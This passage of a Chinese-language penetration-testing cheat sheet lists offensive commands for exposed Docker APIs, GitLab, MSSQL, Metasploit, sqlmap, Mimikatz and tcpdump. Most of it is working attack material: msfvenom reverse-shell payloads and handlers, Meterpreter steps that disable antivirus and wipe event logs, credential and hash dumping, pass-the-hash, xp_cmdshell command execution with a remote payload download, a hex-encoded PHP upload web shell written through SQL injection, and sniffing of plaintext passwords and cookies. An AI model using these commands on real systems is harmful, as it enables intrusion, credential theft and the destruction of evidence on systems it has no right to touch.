ps -ef | grep /bin/ps |grep -v grep | awk '{print $2}'| xargs kill |rm -rf /bin/iptable6 && rm -rf /tmp/.wq4sMLArXw	//结束相关进程，并删除后门
```

# Docker
```
通过使用版本请求http://:2376/version或http://:2375/version验证docker
docker -H <host>:<port> info	//测试公开的API
docker -H 192.168.1.7:2376 ps	//查看在运行的容器
docker -H 192.168.1.7:2376 ps -a	//查看停止的容器
docker -H 192.168.1.7:2376 images	//主机上拉取的images
docker -H 192.168.1.7:2376 exec -it <container name> /bin/bash	//进入容器执行bash shell
```

# Graphql
```
example.com/graphql?query={__schema{types{name,fields{name}}}}
如您所见，有一个名为“ User”的类型，它有两个名为“ username”和“ password”的字段。以“ __”开头的类型可以忽略，因为它们是自省系统的一部分。
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```

# Gitlab
```
注意：确保新/老Gitlab服务器版本相同。查看备份文件路径ps aux | grep gitlab-rails -c 参数是配置文件路径gitlab.yml配置文件搜索backup找到备份保存路径

gitlab-rake gitlab:env:info	//gitlab环境变量版本查看
grep gitlab /opt/gitlab/version-manifest.txt	//检查gitlab版本号以及CE/EE发行版
gitlab-rake gitlab:backup:create	//创建备份文件
chmod 777 1502357536_2017_08_10_9.4.3_gitlab_backup.tar	//将备份文件权限修改为777，不然可能恢复的时候会出现权限不够，不能解压的问题
gitlab-ctl stop unicorn	//停止相关数据连接服务
gitlab-ctl stop sidekiq	//停止相关数据连接服务
gitlab-rake gitlab:backup:restore BACKUP=1502357536_2017_08_10_9.4.3	//备份文件编号为备份文件_gitlab_backup.tar之前的内容，从备份文件中恢复Gitlab
gitlab-ctl start	//启动Gitlab

gitlab命令行重设密码
gitlab-rails console production
u = User.where(id:1).first
u.password = 'your_new_password'
u.password_confirmation = 'your_new_password'
u.save!
quit
或
gitlab-rails console production
u = User.find_by(email: 'you@your.email')
u.password = 'your_new_password'
u.password_confirmation = 'your_new_password'
u.save!
quit

gitlab PostgreSQL用户表导出备份
gitlab-psql
SELECT COUNT(*) FROM users; //计算总行数
COPY (select id,email,encrypted_password,name,admin,username from users) to '/tmp/users.csv' with csv header;	//导出users表指定字段

gitlab用户hash破解
$2a$10$yrgBKJI/uJDSvCUMRWFTfObk2nmIKrHMK4pvOaoZ.gK9WCYVpCeSy	//默认hash格式，bcrypt算法
hashcat -m 3200 --remove userhash.txt password_dic.txt

访问GitLab的PostgreSQL数据库
1.登陆gitlab的安装服务查看配置文件
cat /var/opt/gitlab/gitlab-rails/etc/database.yml 

production:
  adapter: postgresql
  encoding: unicode
  collation:
  database: gitlabhq_production  //数据库名
  pool: 10
  username: 'gitlab'  //用户名
  password:
  host: '/var/opt/gitlab/postgresql'  //主机
  port: 5432
  socket:
  sslmode:
  sslrootcert:
  sslca:

查看/etc/passwd文件里边gitlab对应的系统用户
[root@localhost ~]# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
gitlab-www:x:496:493::/var/opt/gitlab/nginx:/bin/false
git:x:495:492::/var/opt/gitlab:/bin/sh
gitlab-redis:x:494:491::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:493:490::/var/opt/gitlab/postgresql:/bin/sh  //gitlab的postgresql用户

2.根据上面的配置信息登陆postgresql数据库
[root@localhost ~]# su - gitlab-psql     //登陆用户
-sh-4.1$ psql -h /var/opt/gitlab/postgresql -d gitlabhq_production   连接到gitlabhq_production库
psql (9.2.18)Type "help" for help.
gitlabhq_production=#  \h    查看帮助命令
Available help:  ABORT                            CREATE FUNCTION                  DROP TABLE  ALTER AGGREGATE                  CREATE GROUP                     DROP TABLESPACE  ALTER COLLATION                  CREATE INDEX                     DROP TEXT SEARCH CONFIGURATION  ALTER CONVERSION                 CREATE LANGUAGE                  DROP TEXT SEARCH DICTIONARY  ALTER DATABASE                   CREATE OPERATOR                  DROP TEXT SEARCH PARSER  ALTER DEFAULT PRIVILEGES         CREATE OPERATOR CLASS            DROP TEXT SEARCH TEMPLATE  ALTER DOMAIN                     CREATE OPERATOR FAMILY           DROP TRIGGER  ALTER EXTENSION                  CREATE ROLE                      DROP TYPE
……………………………………………………………………………………………………………………
 
gitlabhq_production-# \l     //查看数据库                                             List of databases        Name         |    Owner    | Encoding |   Collate   |    Ctype    |        Access privileges        ---------------------+-------------+----------+-------------+-------------+--------------------------------- gitlabhq_production | gitlab      | UTF8     | en_US.UTF-8 | en_US.UTF-8 |  postgres            | gitlab-psql | UTF8     | en_US.UTF-8 | en_US.UTF-8 |  template0           | gitlab-psql | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/"gitlab-psql"               +                     |             |          |             |             | "gitlab-psql"=CTc/"gitlab-psql" template1           | gitlab-psql | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/"gitlab-psql"               +                     |             |          |             |             | "gitlab-psql"=CTc/"gitlab-psql"(4 rows)
 
gitlabhq_production-# \dt   //查看多表                       List of relations Schema |                 Name                 | Type  | Owner  --------+--------------------------------------+-------+-------- public | abuse_reports                        | table | gitlab public | appearances                          | table | gitlab public | application_settings                 | table | gitlab public | audit_events                         | table | gitlab public | award_emoji                          | table | gitlab public | boards                               | table | gitlab public | broadcast_messages                   | table | gitlab
……………………………………………………………………………………………………………………
 
gitlabhq_production-# \d abuse_reports    //查看单表                                      Table "public.abuse_reports"    Column    |            Type             |                         Modifiers                          --------------+-----------------------------+------------------------------------------------------------ id           | integer                     | not null default nextval('abuse_reports_id_seq'::regclass) reporter_id  | integer                     |  user_id      | integer                     |  message      | text                        |  created_at   | timestamp without time zone |  updated_at   | timestamp without time zone |  message_html | text                        | Indexes:    "abuse_reports_pkey" PRIMARY KEY, btree (id)
 
gitlabhq_production-# \di    //查看索引                                                        List of relations Schema |                              Name                               | Type  | Owner  |                Table                 --------+-----------------------------------------------------------------+-------+--------+-------------------------------------- public | abuse_reports_pkey                                              | index | gitlab | abuse_reports public | appearances_pkey                                                | index | gitlab | appearances public | application_settings_pkey                                       | index | gitlab | application_settings public | audit_events_pkey                                               | index | gitlab | audit_events public | award_emoji_pkey                                                | index | gitlab | award_emoji public | boards_pkey                                                     | index | gitlab | boards public | broadcast_messages_pkey                                         | index | gitlab | broadcast_messages public | chat_names_pkey                                                 | index | gitlab | chat_names public | ci_application_settings_pkey                                    | index | gitlab | ci_application_settings public | ci_builds_pkey                                                  | index | gitlab | ci_builds public | ci_commits_pkey                                                 | index | gitlab | ci_commits
………………………………………………………………………………………………………………………………………………
 
gitlabhq_production=# SELECT spcname FROM pg_tablespace;  //查看所有表空间
  spcname   ------------ pg_default pg_global(2 rows)
 
gitlabhq_production-# \q    //退出psql-sh-4.1$ exit                //退出登录用户logout
```

# Mssql
```
EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell',1;RECONFIGURE;	//启用
EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell',0;RECONFIGURE;	//关闭
EXEC master..xp_cmdshell 'net user';	//执行命令
如果xp_cmdshell扩展存储过程被删除，可以使用以下语句重新添加:
EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int;EXEC sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll';
HH.exe http://x.x.x.x/test.exe c:\\test.exe  //命令行下载
```

# Metasploit
```
msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.43.100
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > exploit -j -z

msf > reload_all	//重新加载所有模块
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf	//Linux x86
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf	//Linux x64
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe	//Windows x86
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe	//Windows x64
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe	//添加管理员账号
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll >32.dll	//Windows x86 dll 适合nc监听
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll >64.dll	//Windows x64 dll 适合nc监听
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php	//PHP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp	//ASP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp	//JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war	//WAR

meterpreter > getuid     //查看当前权限
meterpreter > getsystem //提升权限
meterpreter > ps      //列出当前进程
meterpreter > migrate 2044 //迁移到PID为2044的explorer进程
meterpreter > run checkvm	//虚拟机检查
meterpreter > run getcountermeasure	//靶机安全设置检查
meterpreter > run getgui -e	//开启靶机rdp连接(3389)
meterpreter > run killav	//禁用靶机杀毒
meterpreter > clearev	//毁灭证据 (清除一切系统日志）
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber	//终端端口查看
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f	//开启3389

meterpreter >portfwd add -l 5555 -p 3389 -r 192.168.0.111	//端口转发，本机监听5555，把目标机3389转到本机5555
root@bt:~# rdesktop -u Administrator -p 123qwe 127.0.0.1:5555	//metasploit本机登陆远程3389
portfwd list	//列出端口转发条目
portfwd delete -i 1	//删除id为1的端口转发
portfwd flush	//清空所有转发

meterpreter > run get_local_subnets	//获取靶机的本地子网掩码
meterpreter > run autoroute -s 172.16.63.0/24	//自动添加至路由表
msf exploit(handler) > route add 172.16.63.0 255.255.255.0 1	//手工添加路由表
meterpreter > background	//将运行着的session退至后台
msf exploit(handler) > route print	//查看路由表映射情况

meterpreter > hashdump	//获取密码hash
meterpreter > load mimikatz	//加载mimikatz模块
meterpreter > kerberos	//获取明文密码

use auxiliary/server/socks4a	//应用代理模块
set SRVPORT 1080	//设置代理端口
run	//运行
sudo vi /etc/proxychains.conf	//设置PROXYCHAINS 本地ip和监听端口1080

msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.57.131
msf exploit(psexec) > set SMBUSER vagrant
msf exploit(psexec) > set SMBPASS aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
msf exploit(psexec) > exploit

msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(smb_login) > set RHOSTS 192.168.1.0/24
msf auxiliary(smb_login) > set SMBUser victim
msf auxiliary(smb_login) > set SMBPass s3cr3t
msf auxiliary(smb_login) > set THREADS 50
msf auxiliary(smb_login) > run

msf > use auxiliary/scanner/ssh/ssh_login_pubkey
msf auxiliary(ssh_login_pubkey) > set KEY_FILE /tmp/id_rsa
msf auxiliary(ssh_login_pubkey) > set USERNAME root
msf auxiliary(ssh_login_pubkey) > set RHOSTS 192.168.1.154
msf auxiliary(ssh_login_pubkey) > run

use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 443
msf exploit(handler) > set LHOST 127.0.0.1
msf exploit(handler) > set exitonsession false
msf exploit(handler) > run -j
创建反向SSH隧道
root@kali:~# ssh -R 443:127.0.0.1:443 root@pwnd.linux.box
修改攻击机器/etc/ssh/sshd_config添加
GatewayPorts yes
```

# CrackMapExecWin

+ https://github.com/maaaaz/CrackMapExecWin

# sqlmap
```
sqlmap中自带的shell以及一些二进制文件不能直接使用的，为防止被误杀都经过异或方式编码的（所幸sqlmap自带解码工具）
sqlmap/extra/cloak	//sqlmap安装目录/extra/cloak下

Usage: ./cloak.py [-d] -i <input file> [-o <output file>]

Options:
  --version      show program's version number and exit
  -h, --help     show this help message and exit
  -d             Decrypt
  -i INPUTFILE   Input file
  -o OUTPUTFILE  Output file

Linux MySQL Udf 提权
pip install PyMySQL	//-d 参数所需依赖
sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" --sql-shell	//连接数据库执行sql语句,查询数据库插件路径
show variables like "%plugin%"; 或 select @@plugin_dir;
sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" --file-write=/lib_mysqludf_sys.so --file-dest=/usr/lib/mysql/plugin/	//上传lib_mysqludf_sys.so到MySQL插件目录
sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" --sql-shell	//激活存储过程「sys_exec」函数，执行系统命令
CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
SELECT * FROM information_schema.routines
sys_exec(id);

mysql数据库–sql-shell查询语句
SELECT @@VERSION;	//查看msyql版本
SELECT @@hostname;	//查看数据库主机名
SELECT user,password,host FROM mysql.user;	//查看数据库用户密码和连接地址
SELECT schema_name FROM information_schema.schemata;	//查看数据库
SELECT * from mysql.user where user = substring_index(user(), '@', 1) ;	//查询当前数据库用户权限
SELECT id,name,password,secret_key from admin_db.user_xxxx where is_delete = 0;	//指定条件查询数据
SELECT table_schema,COUNT(table_name) FROM information_schema.TABLES GROUP BY table_schema	//统计所有库下的表个数
SELECT table_schema,GROUP_CONCAT(table_name) FROM  information_schema.tables GROUP BY table_schema;	//查询整个数据库中所有库和所对应的表信息

mysql数据库–sql-query查询语句
sqlmap -u "https://x.x.x.x/index.php?id=1" --sql-query "select id,name,password,secret_key from admin_db.user_xxxx where is_delete = 0" -o	//指定条件查询数据select 字段 from 数据库名.表名 where 判断 = 条件
sqlmap -u "https://x.x.x.x/index.php?id=1" --sql-query "UPDATE admin_db.user_xxxx SET is_delete=0 WHERE id=3" -o	//UPDATE 数据库名.表名 SET 字段名=值 WHERE 判断=条件
sqlmap -u "https://x.x.x.x/index.php?id=1" --sql-query "INSERT INTO admin_db.admin_xxxx_ip (ip,memo,time,operator) VALUES('127.0.0.1', '365',1554515620,943)"	//插入新数据

sqlserver数据库–sql-shell查询语句
SELECT name FROM master..sysdatabases	//查询数据库
SELECT name FROM master..sysobjects WHERE xtype='U'	//查询表明
SELECT Name FROM SysColumns Where id=Object_Id('TableName')	//获取字段名
SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename'	//查字段名
SELECT TOP 1 * FROM 数据库..表名	//查看数据库中表的一条记录

–sql-shell 写马
知道网站路径后需要将上传脚本转换为十六进制
<form enctype="multipart/form-data" action="upload.php" method="POST"><input name="uploadedfile" type="file"/><input type="submit" value="Upload File"/></form> <?php $target_path=basename($_FILES['uploadedfile']['name']);if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'],$target_path)){echo basename($_FILES['uploadedfile']['name'])." has been uploaded";}else{echo "Error!";}?>
现在让我们用sqlmap启动–sql-shell并注入
SELECT 0x3c666f726d20656e63747970653d226d756c7469706172742f666f726d2d646174612220616374696f6e3d2275706c6f61642e70687022206d6574686f643d22504f5354223e3c696e707574206e616d653d2275706c6f6164656466696c652220747970653d2266696c65222f3e3c696e70757420747970653d227375626d6974222076616c75653d2255706c6f61642046696c65222f3e3c2f666f726d3e0d0a3c3f70687020247461726765745f706174683d626173656e616d6528245f46494c45535b2775706c6f6164656466696c65275d5b276e616d65275d293b6966286d6f76655f75706c6f616465645f66696c6528245f46494c45535b2775706c6f6164656466696c65275d5b27746d705f6e616d65275d2c247461726765745f7061746829297b6563686f20626173656e616d6528245f46494c45535b2775706c6f6164656466696c65275d5b276e616d65275d292e2220686173206265656e2075706c6f61646564223b7d656c73657b6563686f20224572726f7221223b7d3f3e INTO OUTFILE "/home/relax/public_html/upload.php";
几秒钟后，如果成功，您应该得到确认http://x.x.x.x/upload.php
```

# Mimikatz
```
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonPasswords full" exit

mimikatz.exe "privilege::debug" "log" "sekurlsa::logonPasswords full" exit
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:remoteserver /ntlm:{NTLM_hash} \"/run:mstsc.exe /restrictedadmin\""

mimikatz.exe "privilege::debug" "log" "sekurlsa::logonPasswords full" exit
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:remoteserver /ntlm:{NTLM_hash} \"/run:mstsc.exe /restrictedadmin\""

mimikatz.exe "privilege::debug" "log" "sekurlsa::ekeys full" exit
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:remoteserver /aes256:{aes256_hmac} \"/run:mstsc.exe /restrictedadmin\""
```

# Tcpdump
```
tcpdump -i eth1 -s0 -w tcpdump.pcap	//指定网卡，-s0会将大小设置为无限制-如果您要捕获所有流量，请使用此大小。如果要从网络流量中提取二进制文件/文件，则需要。-w保存文件
tcpdump -i eth1 src host 192.168.1.1 -w tcpdump.pcap	//指定源地址
tcpdump -i eth1 dst host 192.168.1.1 -w tcpdump.pcap	//指定目的地址
tcpdump -i eth1 port 25	-w tcpdump.pcap //抓取所有经过 eth1，目的或源端口是 25 的网络数据
tcpdump -i eth1 -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' -w tcpdump.pcap	//抓取get请求
tcpdump -i eth1 -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354' -w tcpdump.pcap //抓取post请求
tcpdump -i eth1 -nn -A -s0 -l -w tcpdump.pcap | egrep -i 'Set-Cookie|Host:|Cookie:'	//抓取cookie
tcpdump -i eth1 -s 0 -A -n -l -w tcpdump.pcap | egrep -i "POST /|GET /|pwd=|passwd=|password=|os_password=|user[password]=|Host:"	//抓取post/get明文密码
tcpdump -p -vv -s 0 -w tcpdump.pcap	//不指定网卡嗅探
tcpdump -i any -s 0 -w tcpdump.pcap	//当机器有多个网卡，不确定流量走哪个时，使用这个选项
tcpdump -r <input_pcap> -w <output_pcap> -C <file_size>	//input_pcap是您要拆分的文件的名称，output_pcap是输出，而<file_size>是拆分文件的近似大小以兆字节为单位。
tcpdump -r input_packet_capture.pcap -w output_packet_capture.pcap -C 25	//将文件拆分为约25mb的块
```

# Kubectl安装
```
https://storage.googleapis.com/kubernetes-release/release/stable.txt	//查看最新稳定版Kubectl二进制文件
https://storage.googleapis.com/kubernetes-release/release/v1.16.0/bin/windows/amd64/kubectl.exe	//windows下载Kubectl二进制文件
https://storage.googleapis.com/kubernetes-release/release/v1.16.0/bin/linux/amd64/kubectl	//linux下载Kubectl二进制文件
```

# Chopper菜刀
```
1、修改了数据库连接方式如Oracle连接方式改为： 
<T>XDB</T> 
<X> 
oracle.jdbc.driver.OracleDriver 
jdbc:oracle:thin:@localhost:1521 
scott 
woshimima 
orcl 
</X> 

jdbc:oracle:thin:@localhost:1521是对应版本的Oracle的URL地址。localhost替换成目标IP、1521是默认Oracle端口。 
scott是用户名 
woshimima是数据库密码 
orcl是数据库名 
其中帐号或密码可以为空的表示方式必须是:[/null] 
如Mysql空密码连接示例： 
<T>XDB</T> 
<X> 
com.mysql.jdbc.Driver 
jdbc:mysql://localhost/test 
root 
[/null] 
</X> 
[/null]表示空密码 
jdbc:mysql://localhost/test当中的test是数据库名 

其他数据库连接方式： 
<T>XDB</T> 
<X> 
com.microsoft.sqlserver.jdbc.SQLServerDriver 
jdbc:sqlserver://192.168.1.132:1433;databaseName=test 
sa 
woshimima 
</X> 
databaseName=test是对应的数据名 
sa是帐号 
woshimima是数据库密码



连接任意数据库： 
ORACLE： 
oracle.jdbc.driver.OracleDriver 
jdbc:oracle:thin:@主机地址:端口 
帐号 
密码 
数据库名 


MSSQL2000： 
com.microsoft.jdbc.sqlserver.SQLServerDriver 
jdbc:microsoft:sqlserver://主机地址:端口;databasename=数据库名 
帐号 
密码 

MSSQL2005： 
com.microsoft.sqlserver.jdbc.SQLServerDriver 
jdbc:sqlserver://主机地址:端口;databaseName==数据库名 
帐号 
密码 

MYSQL: 
com.mysql.jdbc.Driver 
jdbc:mysql://主机地址:端口/数据库名 
帐号 
密码 

Db2: 
com.ibm.db2.jcc.DB2Driver 
jdbc:db2://主机地址:端口/数据库名 
帐号 
密码 

Informix： 
com.informix.jdbc.IfxDriver 
jdbc:informix-sqli://主机地址:端口/数据库名 
帐号 
密码 

Sybase2: 
com.sybase.jdbc2.jdbc.SybDriver 
jdbc:sybase:Tds:主机地址:端口?ServiceName=数据库名 
帐号 
密码 

Sybase3： 
com.sybase.jdbc3.jdbc.SybDriver 
jdbc:sybase:Tds:主机地址:端口?ServiceName=数据库名 
帐号 
密码 

PostgreSQL: 
org.postgresql.Driver 
jdbc:postgresql://主机地址:端口/数据库名 
帐号 
密码 

Teradata： 
com.ncr.teradata.TeraDriver 
jdbc:teradata://主机地址:端口/数据库名 
帐号 
密码 

Netezza: 
org.netezza.Driver 
jdbc:netezza://主机地址:端口/数据库名 
帐号 
密码 

JTDS驱动连接MSSQL: 
net.sourceforge.jtds.jdbc.Driver 
jdbc:jtds:sqlserver://主机地址:端口/数据库名 
帐号 
密码
```
